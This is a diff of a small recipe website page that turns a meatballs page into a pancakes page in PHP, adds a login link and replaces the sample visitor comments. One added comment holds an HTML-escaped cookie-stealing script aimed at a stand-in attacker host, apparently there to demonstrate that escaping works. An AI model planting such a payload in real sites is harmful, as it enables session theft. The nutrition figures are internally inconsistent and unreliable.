@@ -1,3 +1,10 @@
+<?php
+include_once '../includes/db-connect.php';
+include_once '../includes/functions.php';
+
+session_start(); 
+?>
+
 <!DOCTYPE html>
 <html>
     <head>
@@ -19,15 +26,16 @@
         <input type="checkbox" id="show-menu" role="button">
         <div id="menu">
             <ul>
-                <li><a href="../index.html">Home</a></li>
+                <li><a href="../index.php">Home</a></li>
                 <li><a href="../calendar.html">Calendar</a></li>
                 <li class="dropdown">
                     <a href="#" class="dropbtn">Recipes</a>
                     <div class="dropdown-content">
-                        <a class="active" href="meatballs.html">Meatballs</a>
-                        <a href="pancakes.html">Pancakes</a>
+                        <a href="meatballs.php">Meatballs</a>
+                        <a class="active" href="pancakes.php">Pancakes</a>
                     </div>
                 </li>
+                <li><a href="login.php">Log in</a></li>
             </ul>
         </div>
 
@@ -36,47 +44,45 @@
             <div class="col span_1_of_2"> <!-- Left div -->
                 <!-- Food name -->
                 <div id="foodname" class="subdiv">
-                    <h1>Meatballs</h1>
+                    <h1>Pancakes</h1>
                 </div>
                 <!-- Ingredients -->
                 <div id="ingredients" class="subdiv">
                     <h2>Ingredients</h2>
                     <ul>
-                        <li>1lb ground beef</li>
-                        <li>1 large egg</li>
-                        <li>1/4 cup onion</li>
-                        <li>1/3 cup italian seasoned breadcrumbs</li>
-                        <li>1/4 cup milk</li>
-                        <li>1 teaspoon Worcestershire sauce</li>
-                        <li>salt, to taste</li>
-                        <li>fresh ground black pepper, to taste</li>
+                        <li>1 cup all-purpose flour</li>
+                        <li>1 egg</li>
+                        <li>2 tablespoons white sugar</li>
+                        <li>1 cup milk</li>
+                        <li>2 teaspoons baking powder</li>
+                        <li>2 tablespoons vegetable oil</li>
+                        <li>1 teaspoon salt</li>
                     </ul>
                 </div>
                 <!-- Directions -->
                 <div id="directions" class="subdiv">
                     <h2>Directions</h2>
                     <ol>
-                        <li>Mix the sirloin, egg, milk, salt/pepper, and the Worcestershire sauce.</li>
-                        <li>Add as much of the bread crumbs as you need (mixture should be slightly moist).</li>
-                        <li>Roll into desired sized balls.</li>
-                        <li>Preheat oven to 375F.</li>
-                        <li>Plane onto a cookie sheet or 13x9 baking dish.</li>
-                        <li>Bake meatballs for 15-23minutes or until no pink remains.</li>
-                        <li>Drain onto papel towels.</li>
+                        <li>In a large bown, mix flour, sugar, baking powder and salt. Make a well in the center, and pour in milk, egg and oil. Mix until smooth.</li>
+                        <li>Heat a lightly oiled griddle or frying pan over medium high heat. Pour or scoop the batter onto the griddle, using aproximately 1/4 cup for each pancake. Brown on both sides and serve hot.</li>
                     </ol>
                 </div>
                 <!-- Comments -->
                 <div id="comments" class="subdiv">
                     <h2>Comments</h2>
                     <div class="comment">
-                        <h3>Anna</h3>
-                        <p>Love your site!</p>
+                        <h3>James</h3>
+                        <p>Pancakes even my dog doesn't like.</p>
                     </div>
                     <div class="comment">
-                        <h3>Lisa</h3>
-                        <p>I am real please click on this link to earn 1000€ a day from home!!!! www.scam.com</p>
+                        <h3>1337Hax0r_BinaryH3x0wnUrMom_KEK</h3>
+                        <p>&lt;script&gt;document.location=&quot;http://www.0wn3dddd.com/stealer.php?c=&quot;+document.cookie;&lt;&frasl;script&gt;</p>
                     </div>
- 
+                    <div class="comment">
+                        <h3>Anonymous</h3>
+                        <p>Can I make these without eggs?</p>
+                    </div>
+
                     <div class="commentform">
                         <form id="usrform" action="#">
                             <label for="name">Name:</label>
@@ -91,7 +97,7 @@
             <div class="col span_1_of_2"> <!-- Right div -->
                 <!-- Picture -->
                 <div id="picture" class="subdiv">
-                    <img src="../images/meatballs.png" alt="Meatballs picture">
+                    <img src="../images/pancakes.png" alt="Pancakes picture">
                 </div>
                 <!-- Nutritional facts -->
                 <div id="nutrifacts" class="subdiv">
@@ -103,15 +109,15 @@
                         </tr>
                         <tr>
                             <th>Energi</th>
-                            <th>1820kJ/433kcal</th>
+                            <th>1820kJ/512kcal</th>
                         </tr>
                         <tr>
                             <th>Protein</th>
-                            <th>8,7g</th>
+                            <th>3g</th>
                         </tr>
                         <tr>
                             <th>Kolhydrater</th>
-                            <th>66g</th>
+                            <th>82g</th>
                         </tr>
                         <tr>
                             <th>Fett</th>
@@ -119,11 +125,11 @@
                         </tr>
                         <tr>
                             <th>Kostfiber</th>
-                            <th>5,6g</th>
+                            <th>1,2g</th>
                         </tr>
                         <tr>
                             <th>Natrium</th>
-                            <th>0,08g</th>
+                            <th>0,01g</th>
                         </tr>
                     </table>
                 </div>
